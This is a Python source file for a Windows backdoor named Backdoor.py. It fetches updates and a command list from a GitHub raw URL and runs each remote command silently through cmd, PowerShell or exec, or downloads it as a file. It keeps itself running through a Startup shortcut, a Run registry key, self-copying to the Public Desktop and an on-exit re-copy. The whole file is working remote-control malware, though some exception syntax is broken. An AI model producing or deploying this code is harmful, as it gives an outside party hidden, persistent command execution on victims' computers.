import os
import shutil
import subprocess
import sys
try:
    import requests
except ModuleNotFoundError:
    subprocess.check_call(["python", "-m", "pip", "install", "requests"])
    import requests

version = "1.0.0"
download_path = "C:\\Users\\Public\\Downloads"
current_dir = os.path.dirname(os.path.abspath(__file__))

Needed_folders = [f"{download_path}", "C:\\Users\\Public\\Desktop"]

def make_update_script():
    update_script_content = f"""
    @echo off
    timeout /t 3 /nobreak >nul
    del "{current_dir}\\Backdoor.py"
    move "{download_path}\\Backdoor.py" "{current_dir}\\Backdoor.py"
    del "%~f0"
    """

    with open("update.bat", "w") as f:
        f.write(update_script_content)

    if os.path.exists("update.bat"):
        subprocess.Popen("update.bat", shell=True)
    else:
        subprocess.Popen(f"echo @echo off>update.bat && echo timeout /t 3 /nobreak >nul>>update.bat && echo del \"{current_dir}\\Backdoor.py\">>update.bat && echo move \"{download_path}\\Backdoor.py\" \"{current_dir}\\Backdoor.py\">>update.bat && echo del \"%~f0\">>update.bat", shell=True)
        if os.path.exists("update.bat"):
            subprocess.Popen("update.bat", shell=True)
        else:
            print("Failed to create update script.")

def find_new_version(url):
    stat = requests.get(url)
    if stat.status_code == 200:
        if os.path.exists("version.txt"):

            with open("version.txt", "r") as f:
                local_version = f.read().strip()

                if local_version != version:

                    os.remove("version.txt")

                    if stat.text.strip() != version:
                        return False
                    else:
                        return True
                    
                else:
                    if stat.text.strip() != local_version:
                        return False
        else:
            with open("version.txt", "w") as f:
                f.write(stat.text.strip())
            
            if version < stat.text.strip():
                return False
        return True
    return 404
    
    
def update_software():
    if not find_new_version("https://raw.githubusercontent.com/thompog/d/refs/heads/main/version.txt"):
        response = requests.get("https://raw.githubusercontent.com/thompog/d/refs/heads/main/Backdoor.py")

        os.chdir(download_path)

        with open("Backdoor.py", "w") as file:
            file.write(response.text)

        make_update_script()
    elif find_new_version("https://raw.githubusercontent.com/thompog/d/refs/heads/main/version.txt") == 404:
        sys.exit()

def make_main_folders():
    for folder in Needed_folders:
        if not os.path.exists(folder):
            os.makedirs(folder)

def github_get_filename(url):
    return url.split("/")[-1]

def install(url):
    filename = github_get_filename(url)
    response = requests.get(url)

    if response.status_code == 200:
        with open(filename, "wb") as file:
            file.write(response.content)

    return response.status_code

def make_startup_file():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(startup_path, "Backdoor.lnk")
    target_path = os.path.join(current_dir, "Backdoor.py")

    if not os.path.exists(shortcut_path):
        try:
            import winshell
            from win32com.client import Dispatch
        except ModuleNotFoundError:
            subprocess.check_call(["python", "-m", "pip", "install", "winshell", "pywin32"])
            import winshell
            from win32com.client import Dispatch

        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target_path
        shortcut.save()

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def get_commands_from_server():
    try:
        response = requests.get("https://raw.githubusercontent.com/thompog/d/refs/heads/main/commands.txt")
        if response.status_code == 200:
            commands = response.text.strip().splitlines()
            return commands
    except Exception as e:
        print("")
    return 404

def execute_command(command):
    try:
        subprocess.Popen(f"{command}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
    except subprocess.CalledProcessError, Exception, subprocess.TimeoutExpired, subprocess.SubprocessError:
        try:
            subprocess.Popen(f"cmd /c {command}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
        except subprocess.CalledProcessError, Exception, subprocess.TimeoutExpired, subprocess.SubprocessError:
            try:
                subprocess.Popen(f"powershell -Command {command}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            except subprocess.CalledProcessError, Exception, subprocess.TimeoutExpired, subprocess.SubprocessError:
                try:
                        subprocess.Popen(f"start {command}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
                except subprocess.CalledProcessError, Exception, subprocess.TimeoutExpired, subprocess.SubprocessError:
                    try:
                            exec(command)
                    except Exception:
                        if install(command) == 404:
                            pass
    
def move_it_self_to_public_disktop():
    target_path = os.path.join("C:\\Users\\Public\\Desktop", "Backdoor.py")
    if not os.path.exists(target_path):
        shutil.copyfile(os.path.join(current_dir, "Backdoor.py"), target_path)
    else:
        return
    
    restart_program()

def anti_close():
    import atexit
    def on_exit():
        move_it_self_to_public_disktop()
    atexit.register(on_exit)

update_software()
make_main_folders()

if os.path.exists(os.path.join("C:\\Users\\Public\\Desktop", "Backdoor.py")):
    os.system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Backdoor /t REG_SZ /d \"pythonw.exe C:\\Users\\Public\\Desktop\\Backdoor.py\"")

make_startup_file()
move_it_self_to_public_disktop()

commands = get_commands_from_server()
if commands == 404:
    sys.exit()

for command in commands:
    execute_command(command)